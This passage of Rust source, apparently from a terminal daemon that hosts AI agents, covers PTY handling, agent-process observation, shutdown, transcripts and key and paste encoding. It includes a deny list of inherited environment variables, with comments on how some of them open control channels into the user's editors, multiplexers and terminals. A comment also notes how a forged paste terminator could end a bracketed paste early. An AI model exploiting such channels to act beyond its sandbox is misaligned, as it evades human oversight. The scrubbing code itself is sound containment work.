    fn carry(&mut self, socket: &std::path::Path) -> Result<Carried, String> {
        self.input_drained_for_handoff()?;
        // Observed while this worker still owns the terminal's processes.
        self.refresh_resume_hint(true);
        self.stop_reading()?;
        let detached = carry::screen(&mut self.terminal, holder::MAX_SCREEN)
            .and_then(|screen| self.holder.detach(socket, &screen));
        if let Err(error) = detached {
            match Reader::start(
                self.terminal_id,
                &self.master,
                self.pty_capacity,
                Vec::new(),
            ) {
                Ok(reader) => {
                    self.reader = Some(reader.thread);
                    self.reader_wake = Some(reader.wake);
                    self.reader_done = reader.done;
                    self.pty_rx = reader.output;
                }
                Err(restart) => self.error("resume reading terminal", restart),
            }
            return Err(error);
        }
        self.carried = true;
        Ok(Carried {
            size: self.current_size,
            theme: self.theme.get(),
            hint: self.resume_hint.clone(),
        })
    }

    /// Stops the reader and takes in everything it read. A reader that will
    /// not stop may still read, which leaves the terminal to it.
    fn stop_reading(&mut self) -> Result<(), String> {
        drop(self.reader_wake.take());
        let deadline = std::time::Instant::now() + READER_SHUTDOWN_GRACE;
        let mut reading = true;
        while reading {
            crossbeam_channel::select! {
                recv(self.pty_rx) -> message => match message {
                    Ok(PtyMessage::Bytes(bytes)) => self.process_output(bytes),
                    // Nothing more to read; the holder has the rest.
                    Ok(PtyMessage::Eof | PtyMessage::Error(_)) | Err(_) => reading = false,
                },
                recv(self.reader_done) -> _ => reading = false,
                default(deadline.saturating_duration_since(std::time::Instant::now())) => {
                    // The reader may yet read: handing the terminal over now
                    // could lose or reorder its output.
                    return Err("the terminal's reader did not stop".into());
                }
            }
        }
        if let Some(reader) = self.reader.take() {
            let _ = reader.join();
        }
        while let Ok(message) = self.pty_rx.try_recv() {
            if let PtyMessage::Bytes(bytes) = message {
                self.process_output(bytes);
            }
        }
        Ok(())
    }

    fn inspect_close(&self, deadline: std::time::Instant) -> Result<(bool, FrozenFamily), String> {
        let root = self
            .child_identity
            .as_ref()
            .ok_or("Child identity unavailable")?;
        let family = FrozenFamily::capture(root, deadline)?;
        // SAFETY: this worker owns the live PTY throughout the frozen census.
        let foreground = unsafe { libc::tcgetpgrp(self.master.as_raw_fd()) };
        if foreground <= 0 {
            return Err("Foreground process group unavailable".into());
        }
        // Process-only policy deliberately permits terminating shell builtins.
        // The original executable check still prevents an exec'd agent or
        // command from inheriting an idle shell's authority.
        let idle_shell = interactive_shell_launch(&self.launch) && root.original_executable();
        Ok((
            family.has_jobs()
                || foreground != root.process.group
                || !idle_shell
                || !self.pending_input.is_empty()
                || !self.commands.is_empty()
                || !self.retained_commands.is_empty(),
            family,
        ))
    }

    fn foreground_group(&self) -> Option<libc::pid_t> {
        // SAFETY: this worker owns the live master descriptor.
        let group = unsafe { libc::tcgetpgrp(self.master.as_raw_fd()) };
        (group > 0).then_some(group)
    }

    fn observe_agent_process(&mut self) -> Option<&AgentProcess> {
        let group = self.foreground_group();
        let process = if self.agent_exited {
            None
        } else {
            group
                .and_then(crate::model::agent_recovery::foreground_agent)
                // A group that moved mid-walk invalidates what the walk saw.
                .filter(|_| self.foreground_group() == group)
        };
        self.adopt_agent_process(process);
        self.agent_process.as_ref()
    }

    fn adopt_agent_process(&mut self, process: Option<AgentProcess>) {
        let changed = process != self.agent_process;
        if process.is_none() || process != self.agent_process {
            self.set_agent_activity(process.as_ref().map(|process| crate::agent::Activity {
                provider: process.provider,
                state: crate::agent::ActivityState::Unknown,
            }));
        }
        self.agent_process = process.clone();
        if changed {
            *self
                .published
                .agent_process
                .lock()
                .unwrap_or_else(|p| p.into_inner()) = process;
            if let Some(observer) = self.published.agent_observer.get() {
                observer();
            }
        }
    }

    /// Timer-driven observation. The descent is only worth its cost while the
    /// foreground group is moving, so an unchanged group backs the interval
    /// off. It must still be sampled: `exec claude` or a child without shell job
    /// control can become an agent without changing the foreground group.
    ///
    /// A hidden terminal is still observed, at the longest interval: its saved
    /// resume hint is what recovery relies on when the daemon goes away, and
    /// an agent can `/resume` or `/clear` into another conversation without
    /// ever leaving the foreground or drawing a title anyone sees.
    fn observe_foreground(&mut self) {
        self.last_foreground_observation = std::time::Instant::now();
        if self.agent_exited {
            // Nothing here can change again, so let the timer settle to its
            // longest interval rather than waking for the rest of its life.
            self.foreground_poll = FOREGROUND_POLL_MAX;
            return;
        }
        if self.foreground_group() == self.resume_foreground {
            self.foreground_poll = (self.foreground_poll * 2).min(FOREGROUND_POLL_MAX);
        }
        self.refresh_resume_hint(true);
        if self.visibility != Visibility::Visible {
            self.foreground_poll = FOREGROUND_POLL_MAX;
        }
    }

    fn refresh_resume_hint(&mut self, force: bool) {
        let foreground = self.foreground_group();
        if !force && self.resume_foreground == foreground {
            return;
        }
        self.last_foreground_observation = std::time::Instant::now();
        if self.resume_foreground != foreground {
            // The group moved: observe promptly again until it settles.
            self.foreground_poll = FOREGROUND_POLL_MIN;
        }
        self.resume_foreground = foreground;
        // One descent answers both questions. Resolving them separately meant
        // two full /proc walks - stat, cmdline, cwd, environ and children per
        // node - for a single observation.
        let observation = if self.agent_exited {
            None
        } else {
            foreground
                .map(|group| {
                    crate::model::agent_recovery::foreground_observation(group, &self.launch)
                })
                // A group that moved mid-walk invalidates what the walk saw.
                .filter(|_| self.foreground_group() == foreground)
        };
        let (hint, process) = observation
            .map(|observation| (observation.hint, observation.agent))
            .unwrap_or_default();
        self.adopt_agent_process(process);
        self.agent_provider = self.agent_process.as_ref().map(|process| process.provider);
        if hint != self.resume_hint {
            self.resume_hint = hint.clone();
            self.emit(TerminalEvent::ResumeHintChanged(hint));
        }
    }

    fn set_agent_activity(&self, activity: Option<crate::agent::Activity>) {
        self.published.set_agent_activity(activity);
    }

    fn set_conversation_title(&self, title: String) {
        let title: String = title.chars().take(256).collect();
        let mut current = self
            .published
            .conversation_title
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        if current.as_ref() != Some(&title) {
            *current = Some(title.clone());
            self.emit(TerminalEvent::ConversationTitleChanged(title));
        }
    }

    /// True means the entire input was admitted, not necessarily consumed.
    fn write_pty(&mut self, bytes: &[u8], operation: &'static str) -> bool {
        if !self.flush_pty_input() {
            return false;
        }
        if bytes.len() > PTY_WRITE_CAPACITY.saturating_sub(self.pending_input.len()) {
            self.error(operation, format!(
                "Terminal isn't reading input; {} KiB pending. Press Ctrl+C to cancel pending input.",
                self.pending_input.len().div_ceil(1024),
            ));
            return false;
        }
        self.pending_input.extend(bytes);
        self.flush_pty_input()
    }

    /// Poll before bounded nonblocking writes. The retry deadline participates
    /// in the command/output select, so a full input buffer never stalls parsing.
    fn flush_pty_input(&mut self) -> bool {
        let mut budget = PTY_BATCH_LIMIT;
        while !self.pending_input.is_empty() && budget > 0 {
            let mut ready = libc::pollfd {
                fd: self.writer.as_raw_fd(),
                events: libc::POLLOUT,
                revents: 0,
            };
            if unsafe { libc::poll(&mut ready, 1, 0) } <= 0
                || ready.revents & (libc::POLLOUT | libc::POLLERR | libc::POLLHUP) == 0
            {
                break;
            }
            let (front, _) = self.pending_input.as_slices();
            match self.writer.write(&front[..front.len().min(budget)]) {
                Ok(0) => {
                    self.pending_input.clear();
                    self.error(
                        "write terminal input",
                        "PTY write returned zero bytes".into(),
                    );
                    return false;
                }
                Ok(written) => {
                    self.pending_input.drain(..written);
                    budget -= written;
                }
                Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => break,
                Err(error) => {
                    self.pending_input.clear();
                    self.error("write terminal input", error.to_string());
                    return false;
                }
            }
        }
        true
    }

    fn interrupt_input(&mut self) -> u64 {
        let (boundary, key) = {
            let mut order = self
                .published
                .input_order
                .lock()
                .unwrap_or_else(|p| p.into_inner());
            self.published
                .interrupt_requested
                .store(false, Ordering::Release);
            (order.generation, order.interrupt_key.take())
        };
        let encoded = match key {
            Some(key) => match encode_key_input(&self.terminal, &mut self.key_encoder, key) {
                Ok(encoded) => encoded,
                Err(error) => {
                    self.error("encode interrupt", error.to_string());
                    return boundary;
                }
            },
            None => vec![3],
        };
        self.pending_input.clear();
        self.retained_commands
            .retain(|command| !is_cancelable_input_before(command, boundary));
        // A producer may keep filling the bounded inbox. Drain only the
        // commands present at this boundary so cancellation itself is bounded.
        for _ in 0..self.commands.len() {
            let Ok(command) = self.commands.try_recv() else {
                break;
            };
            if !is_cancelable_input_before(&command, boundary) {
                self.retained_commands.push_back(command);
            }
        }
        let mut attributes: libc::termios = unsafe { std::mem::zeroed() };
        // The master exposes its exact slave's line discipline. POLLOUT only
        // describes the flip queue: even a writable master can have a full
        // slave input buffer that strands a conventional interrupt byte.
        let conventional_interrupt =
            unsafe { libc::tcgetattr(self.writer.as_raw_fd(), &mut attributes) } == 0
                && attributes.c_lflag & libc::ISIG != 0
                && encoded.len() == 1
                && encoded[0] != 0
                && encoded[0] == attributes.c_cc[libc::VINTR];
        self.cancel_kernel_input();
        if conventional_interrupt {
            // TIOCSIG targets the foreground group bound to this exact PTY.
            // Raw applications and extended key encodings retain their bytes.
            let result =
                unsafe { libc::ioctl(self.writer.as_raw_fd(), libc::TIOCSIG, libc::SIGINT) };
            if result < 0 {
                self.error(
                    "interrupt terminal",
                    std::io::Error::last_os_error().to_string(),
                );
            }
        } else {
            self.write_pty(&encoded, "interrupt terminal");
        }
        boundary
    }

    fn cancel_kernel_input(&self) {
        // The peer ioctl opens this exact slave without a reusable path or a
        // controlling-terminal change. Flushing TCIFLUSH on the master would
        // discard child output; flushing the peer discards canceled input.
        let peer = unsafe {
            libc::ioctl(
                self.writer.as_raw_fd(),
                libc::TIOCGPTPEER,
                libc::O_RDWR | libc::O_NOCTTY | libc::O_CLOEXEC | libc::O_NONBLOCK,
            )
        };
        if peer < 0 {
            self.error(
                "cancel terminal input",
                std::io::Error::last_os_error().to_string(),
            );
            return;
        }
        // SAFETY: the successful ioctl returned a fresh owned descriptor.
        let peer = unsafe { OwnedFd::from_raw_fd(peer) };
        if unsafe { libc::tcflush(peer.as_raw_fd(), libc::TCIFLUSH) } < 0 {
            self.error(
                "cancel terminal input",
                std::io::Error::last_os_error().to_string(),
            );
        }
    }

    fn emit(&self, event: TerminalEvent) {
        let _ = self.events.send(event);
    }

    fn error(&self, operation: &'static str, message: String) {
        self.set_agent_activity(None);
        self.emit(TerminalEvent::Error { operation, message });
    }
}

fn canonical_agent_title(title: &str, activity: Option<crate::agent::Activity>) -> String {
    if let Some(label) = agent_title_label(title, activity) {
        if label.is_empty() {
            "π".into()
        } else {
            format!("π {label}")
        }
    } else {
        title.to_owned()
    }
}

fn agent_title_label(title: &str, activity: Option<crate::agent::Activity>) -> Option<&str> {
    if !activity.is_some_and(|activity| activity.provider == crate::agent::Provider::Omp) {
        return None;
    }
    // The lifecycle glyph is view state, never a durable title or recovery ID.
    let rest = title.strip_prefix("π ")?;
    let glyph = rest.chars().next()?;
    Some(rest[glyph.len_utf8()..].strip_prefix(' ').unwrap_or(""))
}

fn theme_scheme(theme: TerminalTheme) -> ColorScheme {
    if theme.palette().light {
        ColorScheme::Light
    } else {
        ColorScheme::Dark
    }
}
fn coalesce_scroll_command(
    command: Command,
    commands: &Receiver<Command>,
    carried: &mut Option<Command>,
) -> Command {
    let Command::Scroll(ScrollCommand::Delta(mut delta)) = command else {
        return command;
    };
    while let Ok(next) = commands.try_recv() {
        match next {
            Command::Scroll(ScrollCommand::Delta(next_delta)) => {
                delta = delta.saturating_add(next_delta);
            }
            other => {
                *carried = Some(other);
                break;
            }
        }
    }
    Command::Scroll(ScrollCommand::Delta(delta))
}

/// Set parser defaults, not resolved UI RGB values: truecolor and application
/// OSC overrides retain their meaning, and OSC queries observe the same colors.
fn apply_theme(
    terminal: &mut Terminal<'_, '_>,
    theme: TerminalTheme,
) -> Result<(), libghostty_vt::Error> {
    let palette = theme.palette();
    let rgb = |color: super::ThemeColor| {
        let (r, g, b) = color.rgb();
        RgbColor { r, g, b }
    };
    terminal
        .set_default_fg_color(Some(rgb(palette.foreground)))?
        .set_default_bg_color(Some(rgb(palette.background)))?
        .set_default_cursor_color(Some(rgb(palette.cursor)))?;
    let mut colors = terminal.default_color_palette()?;
    for (index, value) in palette.ansi.into_iter().enumerate() {
        colors.set(PaletteIndex(index as u8), rgb(value));
    }
    terminal.set_default_color_palette(Some(colors))?;
    Ok(())
}

fn wait_for_worker_event(
    commands: &Receiver<Command>,
    pty: &Receiver<PtyMessage>,
    child_exit: &Receiver<ChildExit>,
    capture: &Receiver<()>,
    pty_open: bool,
    child_running: bool,
    observe_after: Duration,
    release_after: Option<Duration>,
) -> WorkerEvent {
    // Foreground observation only applies while the child runs; a withheld
    // synchronized update must be released either way. An unbounded wait is
    // `Duration::MAX`, which the channel treats as no deadline.
    let timer = |observe: Option<Duration>| {
        observe
            .into_iter()
            .chain(release_after)
            .min()
            .unwrap_or(Duration::MAX)
    };
    match (pty_open, child_running) {
        (true, true) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
            recv(capture) -> _ => WorkerEvent::Capture,
            recv(pty) -> message => WorkerEvent::Pty(message.ok()),
            recv(child_exit) -> message => WorkerEvent::ChildExit(message.ok()),
            default(timer(Some(observe_after))) => WorkerEvent::Timer,
        },
        (true, false) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
            recv(capture) -> _ => WorkerEvent::Capture,
            recv(pty) -> message => WorkerEvent::Pty(message.ok()),
            default(timer(None)) => WorkerEvent::Timer,
        },
        (false, true) => crossbeam_channel::select! {
            recv(commands) -> message => WorkerEvent::Command(message.ok()),
            recv(capture) -> _ => WorkerEvent::Capture,
            recv(child_exit) -> message => WorkerEvent::ChildExit(message.ok()),
            default(timer(Some(observe_after))) => WorkerEvent::Timer,
        },
        (false, false) => WorkerEvent::Command(commands.recv().ok()),
    }
}

/// Sending HUP successfully does not mean the process exited. Preserve its
/// graceful handler first, then escalate through pinned identities and bound
/// how long a stalled holder can keep a daemon waiting for its exit report.
fn shutdown_child_exit(
    child: &holder::HeldChild,
    identity: Option<&RootIdentity>,
    exits: &Receiver<ChildExit>,
    checked: bool,
) -> ChildExit {
    let deadline = std::time::Instant::now() + CHILD_SHUTDOWN_DEADLINE;
    match exits.try_recv() {
        Ok(result) => return result,
        // A lost report channel does not mean this pinned root stopped.
        Err(TryRecvError::Disconnected | TryRecvError::Empty) => {}
    }
    if !checked {
        if let Err(error) = child.kill() {
            return exits
                .try_recv()
                .unwrap_or_else(|_| Err(format!("hang up child: {error}")));
        }
        match exits.recv_timeout(CHILD_HANGUP_GRACE) {
            Ok(result) => return result,
            Err(RecvTimeoutError::Disconnected) => {
                if child
                    .exited_within(CHILD_HANGUP_GRACE)
                    .map_err(|error| format!("observe child exit: {error}"))?
                {
                    return Err("child reaper closed".into());
                }
            }
            Err(RecvTimeoutError::Timeout) => {}
        }
        let stopped = identity
            .ok_or_else(|| "Child identity unavailable".to_owned())
            .and_then(|root| FrozenFamily::capture(root, deadline))
            .and_then(|mut family| family.kill(deadline));
        if let Err(error) = stopped {
            // Census failure cannot grant authority over guessed descendants.
            // This root remains pinned independently by its holder's pidfd.
            tracing::warn!(%error, "could not stop terminal family; escalating only the pinned root");
            child
                .force_kill()
                .map_err(|error| format!("terminate child: {error}"))?;
        }
    }
    exits
        .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
        .map_err(|error| match error {
            RecvTimeoutError::Disconnected => "child reaper closed".to_owned(),
            RecvTimeoutError::Timeout => {
                "terminal shutdown did not receive a confirmed child exit before its deadline"
                    .to_owned()
            }
        })?
}

fn child_exit_event(
    exited: &mut bool,
    result: ChildExit,
    kill_requested: bool,
) -> Option<TerminalEvent> {
    use std::os::unix::process::ExitStatusExt;

    if *exited {
        return None;
    }
    *exited = true;
    Some(match result {
        Ok(status) => TerminalEvent::Exited {
            exit_code: status.exit_code(),
            signal: status.signal().map(str::to_owned),
            // A successful close request must not hide a crash already waiting
            // in the reaper channel, nor turn wait/reaper failures into success.
            intentional: kill_requested
                && status.signal().is_some()
                && status.signal()
                    == ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGKILL)).signal(),
        },
        Err(message) => TerminalEvent::Error {
            operation: "wait for child",
            message,
        },
    })
}

/// Variables the daemon may have inherited from whatever terminal (or desktop
/// session) launched it. Left in place, a child would believe it is talking to
/// that emulator and emit control sequences libghostty-vt does not implement.
///
/// Some entries are worse than a wrong identity, because they name a live
/// control channel into something of the user's that a card is not inside:
/// `KITTY_LISTEN_ON` fully controls their real kitty instance, `TMUX` and
/// `STY` and `ZELLIJ` reach every pane of their multiplexer session, the
/// `KONSOLE_DBUS_*` triple drives their real Konsole over the session bus, and
/// `NVIM`, `VSCODE_IPC_HOOK_CLI` and `EMACS_SERVER_FILE` each run commands in
/// their editor. A child that inherited any of them could act outside its own
/// card - the exact containment this scrub exists to establish. `LC_TERMINAL`
/// and `LC_TERMINAL_VERSION` match sshd's default `AcceptEnv LC_*`, so they
/// carry the wrong identity onto every host the child then reaches.
///
/// Every emulator here contributes both halves where it has them, identity and
/// channel, because a channel is only reachable once and an identity is only
/// misleading once.
///
/// Color policy from a noninteractive launcher is not the policy of this PTY:
/// inherited NO_COLOR/CLICOLOR can disable ANSI despite TERM and COLORTERM, and
/// COLORFGBG describes the launcher's background rather than our OSC defaults.
/// CI also short-circuits common ANSI capability detectors before truecolor
/// checks; it describes the launcher, not this newly allocated interactive PTY.
/// Explicit recipe entries are restored after this scrub.
const INHERITED_TERMINAL_MARKERS: &[&str] = &[
    "TERM_PROGRAM",
    "TERM_PROGRAM_VERSION",
    "TERM_SESSION_ID",
    "TERMINAL_EMULATOR",
    "TERMINFO",
    "TERMINFO_DIRS",
    "NO_COLOR",
    "FORCE_COLOR",
    "CLICOLOR",
    "CLICOLOR_FORCE",
    "COLORFGBG",
    "CI",
    "KITTY_WINDOW_ID",
    "KITTY_PID",
    "KITTY_INSTALLATION_DIR",
    "KITTY_LISTEN_ON",
    "KITTY_PUBLIC_KEY",
    "KITTY_SHELL_INTEGRATION",
    "GHOSTTY_RESOURCES_DIR",
    "GHOSTTY_BIN_DIR",
    "GHOSTTY_SHELL_FEATURES",
    "GHOSTTY_SHELL_INTEGRATION_NO_SUDO",
    "VTE_VERSION",
    "ALACRITTY_WINDOW_ID",
    "ALACRITTY_SOCKET",
    "ALACRITTY_LOG",
    "WEZTERM_PANE",
    "WEZTERM_UNIX_SOCKET",
    "WEZTERM_EXECUTABLE",
    "WEZTERM_EXECUTABLE_DIR",
    "WEZTERM_CONFIG_DIR",
    "WEZTERM_CONFIG_FILE",
    "ITERM_SESSION_ID",
    "LC_TERMINAL",
    "LC_TERMINAL_VERSION",
    "KONSOLE_VERSION",
    "KONSOLE_DBUS_SERVICE",
    "KONSOLE_DBUS_SESSION",
    "KONSOLE_DBUS_WINDOW",
    "WT_SESSION",
    "WT_PROFILE_ID",
    "ZED_TERM",
    "VSCODE_INJECTION",
    "VSCODE_IPC_HOOK_CLI",
    "VSCODE_GIT_IPC_HANDLE",
    "VSCODE_GIT_ASKPASS_NODE",
    "VSCODE_GIT_ASKPASS_MAIN",
    "EMACS_SERVER_FILE",
    "TMUX",
    "TMUX_PANE",
    "STY",
    "ZELLIJ",
    "ZELLIJ_SESSION_NAME",
    "ZELLIJ_PANE_ID",
    "NVIM",
    "NVIM_LISTEN_ADDRESS",
    "COLORTERM",
];

/// Drops every inherited marker from a command's environment.
///
/// Separate from [`command_from_recipe`] so a test can plant all of them and
/// watch them go, rather than observing that a host which never set them does
/// not have them.
fn scrub_inherited_markers(command: &mut CommandBuilder) {
    command.env_remove("CAGENTS_TERMINAL_ID");
    command.env_remove("CAGENTS_RECOVERY_ORIGIN");
    for name in INHERITED_TERMINAL_MARKERS {
        command.env_remove(name);
    }
}

/// With a PTY, a recognized shell without a command or script operand is an
/// interactive launch. Unknown invocation forms stay active conservatively.
fn interactive_shell_launch(recipe: &LaunchRecipe) -> bool {
    let Some(name) = std::path::Path::new(&recipe.program)
        .file_name()
        .and_then(|name| name.to_str())
    else {
        return false;
    };
    if !matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "dash"
            | "ash"
            | "ksh"
            | "ksh93"
            | "mksh"
            | "pdksh"
            | "yash"
            | "csh"
            | "tcsh"
    ) {
        return false;
    }
    let mut arguments = recipe.arguments.iter();
    while let Some(argument) = arguments.next() {
        match argument.as_str() {
            "--" => return arguments.next().is_none(),
            "--login" | "--interactive" | "--noprofile" | "--norc" | "--no-config" | "--posix" => {}
            "--rcfile" | "--init-file" | "-o" | "+o" | "-O" | "+O" => {
                if arguments.next().is_none() {
                    return false;
                }
            }
            option
                if option.starts_with('-')
                    && !option.starts_with("--")
                    && option.len() > 1
                    && option[1..]
                        .bytes()
                        .all(|byte| byte.is_ascii_alphabetic() && byte != b'c') => {}
            _ => return false,
        }
    }
    true
}

fn command_from_recipe(recipe: &LaunchRecipe) -> CommandBuilder {
    let mut command = CommandBuilder::new(&recipe.program);
    command.args(&recipe.arguments);
    command.cwd(&recipe.working_directory);
    scrub_inherited_markers(&mut command);
    terminal_environment(&mut command);
    // Last, so an explicit per-session entry still wins over our defaults.
    for (name, value) in &recipe.environment {
        command.env(name, value);
    }
    for name in crate::account::launch_credential_overrides(recipe) {
        command.env_remove(name);
    }
    command
}

fn terminal_environment(command: &mut CommandBuilder) {
    // We ship no private terminfo entry; advertise the emulator we implement.
    command.env("TERM", "xterm-256color");
    command.env("COLORTERM", "truecolor");
    command.env("TERM_PROGRAM", "cagents");
    command.env("TERM_PROGRAM_VERSION", crate::VERSION);
}

fn pty_size(size: TerminalSize) -> PtySize {
    PtySize {
        rows: size.rows,
        cols: size.columns,
        pixel_width: u16::try_from(u32::from(size.columns).saturating_mul(size.cell_width_px))
            .unwrap_or(u16::MAX),
        pixel_height: u16::try_from(u32::from(size.rows).saturating_mul(size.cell_height_px))
            .unwrap_or(u16::MAX),
    }
}

/// Read and write ends of the reader's shutdown pipe. Nothing is ever written
/// to it: dropping the write end hangs the read end up, which is the one event
/// a blocking reader can always observe.
fn wake_pipe() -> Result<(OwnedFd, OwnedFd), String> {
    let mut ends = [0 as libc::c_int; 2];
    // SAFETY: `ends` is the two-element array `pipe2` writes into.
    if unsafe { libc::pipe2(ends.as_mut_ptr(), libc::O_CLOEXEC) } != 0 {
        return Err(format!(
            "create PTY reader wake pipe: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `pipe2` filled both entries with fresh owned descriptors.
    unsafe { Ok((OwnedFd::from_raw_fd(ends[0]), OwnedFd::from_raw_fd(ends[1]))) }
}

enum Readiness {
    Readable,
    Shutdown,
    Failed(String),
}

/// Wait until the terminal has output, or until shutdown hangs up the wake
/// pipe. A PTY master read only fails with EIO once the last slave descriptor
/// closes, so a disowned grandchild can keep a blocking read - and therefore
/// shutdown - waiting indefinitely; the pipe is the way out.
fn wait_readable(readiness: &OwnedFd, wake: &OwnedFd) -> Readiness {
    let mut fds = [
        libc::pollfd {
            fd: readiness.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        },
        libc::pollfd {
            fd: wake.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        },
    ];
    loop {
        // SAFETY: this thread owns both descriptors for the whole call.
        let ready = unsafe { libc::poll(fds.as_mut_ptr(), fds.len() as libc::nfds_t, -1) };
        if ready < 0 {
            let error = std::io::Error::last_os_error();
            if error.kind() == std::io::ErrorKind::Interrupted {
                continue;
            }
            return Readiness::Failed(error.to_string());
        }
        if fds[1].revents != 0 {
            return Readiness::Shutdown;
        }
        if fds[0].revents != 0 {
            // Hangup still needs one more read: the parser must see everything
            // the child wrote before its slave closed, and an unreadable
            // descriptor surfaces as EOF or an error from the read itself.
            return Readiness::Readable;
        }
    }
}

fn read_pty(reader: &mut dyn Read, sender: &Sender<PtyMessage>, readiness: OwnedFd, wake: OwnedFd) {
    let mut buffer = vec![0u8; PTY_READ_SIZE];
    loop {
        match wait_readable(&readiness, &wake) {
            Readiness::Readable => {}
            Readiness::Shutdown => return,
            Readiness::Failed(error) => {
                let _ = sender.send(PtyMessage::Error(error));
                return;
            }
        }
        match reader.read(&mut buffer) {
            Ok(0) => {
                let _ = sender.send(PtyMessage::Eof);
                return;
            }
            // A PTY master reads EIO, not end of file, once its terminal's
            // last slave closes: the ordinary end of a terminal.
            Err(error) if error.raw_os_error() == Some(libc::EIO) => {
                let _ = sender.send(PtyMessage::Eof);
                return;
            }
            Ok(read) => {
                if sender
                    .send(PtyMessage::Bytes(buffer[..read].to_vec()))
                    .is_err()
                {
                    return;
                }
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::Interrupted | std::io::ErrorKind::WouldBlock
                ) => {}
            Err(error) => {
                let _ = sender.send(PtyMessage::Error(error.to_string()));
                return;
            }
        }
    }
}

struct TranscriptWriter {
    location: Option<crate::transcript_location::ValidatedTranscript>,
    sender: Sender<TranscriptMessage>,
    /// Published by the writer once the size cap is reached, so the worker can
    /// stop handing over batches the writer would only drop.
    capped: Arc<AtomicBool>,
    worker: JoinHandle<()>,
}

impl TranscriptWriter {
    fn start(
        path: PathBuf,
        terminal: TerminalId,
        capacity: usize,
        max_bytes: u64,
    ) -> Result<Self, String> {
        let file = open_private_append_file(&path)
            .map_err(|error| format!("open transcript {}: {error}", path.display()))?;
        let location = crate::transcript_location::capture(terminal, &path, &file);
        let written = file.metadata().map(|metadata| metadata.len()).unwrap_or(0);
        let (sender, receiver) = crossbeam_channel::bounded(capacity);
        let capped_flag = Arc::new(AtomicBool::new(false));
        let published_cap = Arc::clone(&capped_flag);
        let worker = thread::Builder::new()
            .name("terminal-transcript-writer".into())
            .spawn(move || {
                let mut writer = BufWriter::new(file);
                let mut written = written;
                // Already over cap (e.g. an older uncapped session): the file
                // stays as-is and nothing more is recorded.
                let mut capped = written >= max_bytes;
                if capped {
                    published_cap.store(true, Ordering::Relaxed);
                    let _ = writer.write_all(TRANSCRIPT_TRUNCATED_MARKER);
                    let _ = writer.flush();
                }
                while let Ok(message) = receiver.recv() {
                    match message {
                        TranscriptMessage::Bytes(bytes) => {
                            if capped {
                                continue;
                            }
                            let within_cap =
                                written.saturating_add(bytes.len() as u64) <= max_bytes;
                            if !within_cap {
                                capped = true;
                                published_cap.store(true, Ordering::Relaxed);
                                let _ = writer.write_all(TRANSCRIPT_TRUNCATED_MARKER);
                                let _ = writer.flush();
                                continue;
                            }
                            if writer.write_all(&bytes).is_err() {
                                break;
                            }
                            written += bytes.len() as u64;
                        }
                        TranscriptMessage::Shutdown => break,
                    }
                }
                let _ = writer.flush();
            })
            .map_err(|error| format!("start transcript writer: {error}"))?;
        Ok(Self {
            location,
            sender,
            capped: capped_flag,
            worker,
        })
    }

    /// Whether handing over a batch can still record anything. Racy by
    /// design and deliberately cheap: a full channel or a capped file means
    /// the batch is dropped, and dropping it here costs nothing at all.
    fn accepts(&self) -> bool {
        !self.sender.is_full() && !self.capped.load(Ordering::Relaxed)
    }

    /// Best-effort and never blocking: output bursts faster than the disk
    /// writer are dropped instead of stalling PTY processing. Only a dead
    /// writer thread reports an error.
    fn send(&self, bytes: Vec<u8>) -> Result<(), ()> {
        match self.sender.try_send(TranscriptMessage::Bytes(bytes)) {
            Ok(()) | Err(TrySendError::Full(_)) => Ok(()),
            Err(TrySendError::Disconnected(_)) => Err(()),
        }
    }

    fn finish(self) {
        let _ = self.sender.send(TranscriptMessage::Shutdown);
        drop(self.sender);
        let _ = self.worker.join();
    }
}

fn encode_key_input(
    terminal: &Terminal<'_, '_>,
    encoder: &mut KeyEncoder<'_>,
    input: KeyInput,
) -> Result<Vec<u8>, libghostty_vt::Error> {
    // Legacy encodings have no repeat event type, so a repeated event must be
    // encoded as another press. Keep Repeat only when the child asked for it.
    let report_events = terminal
        .kitty_keyboard_flags()?
        .contains(key::KittyKeyFlags::REPORT_EVENTS);
    let mut event = key::Event::new()?;
    event
        .set_action(map_key_action(input.action, report_events))
        .set_key(map_key(input.key))
        .set_mods(map_modifiers(input.modifiers))
        .set_utf8(input.text);
    if let Some(codepoint) = input.unshifted_codepoint {
        event.set_unshifted_codepoint(codepoint);
    }

    encoder.set_options_from_terminal(terminal);
    let mut encoded = Vec::with_capacity(32);
    encoder.encode_to_vec(&event, &mut encoded)?;
    // Legacy shells cannot distinguish Ctrl+Backspace's BS from Ctrl+H.
    // Use their conventional backward-kill-word binding, but leave negotiated
    // CSI-u/modifyOtherKeys encodings and release events intact.
    if input.key == TerminalKey::Backspace
        && input.modifiers.control
        && !input.modifiers.alt
        && !input.modifiers.shift
        && !input.modifiers.super_key
        && matches!(encoded.as_slice(), b"\x08" | b"\x7f")
    {
        encoded[0] = 0x17;
    }
    Ok(encoded)
}

/// The `ESC [ 200 ~` and `ESC [ 201 ~` a bracketed paste is framed with.
const BRACKETED_PASTE_FRAME_BYTES: usize = 12;

/// The bytes a paste puts on the child's input, encoded by Ghostty against the
/// mode the child is in now.
///
/// In either mode Ghostty turns ESC - which a forged `ESC [ 201 ~` needs to
/// end a bracketed paste early - NUL, DEL, and the tty's signal and line
/// editing characters into spaces. A child that asked for bracketed paste
/// gets the text framed and otherwise as it was: it reads the whole of it as
/// one paste, line breaks included, and decides for itself what to do.
///
/// Any other child reads the text as typed, so a carriage return or line feed
/// in it is Enter, and the readline keys Ghostty leaves alone - ^P for the
/// previous command, ^A, ^E, ^K and the rest - act as they would from the
/// keyboard. A clipboard paste keeps its line breaks, as a paste into any
/// terminal does, arriving as the carriage return Enter sends; a CRLF becomes
/// one of them rather than the two xterm would send, or pasting Windows text
/// would enter every line twice. A drop keeps none of them: every control
/// character but TAB becomes a space, so text dragged in - which its source
/// chose - can be read, edited and entered, but never enters itself.
fn encode_paste(
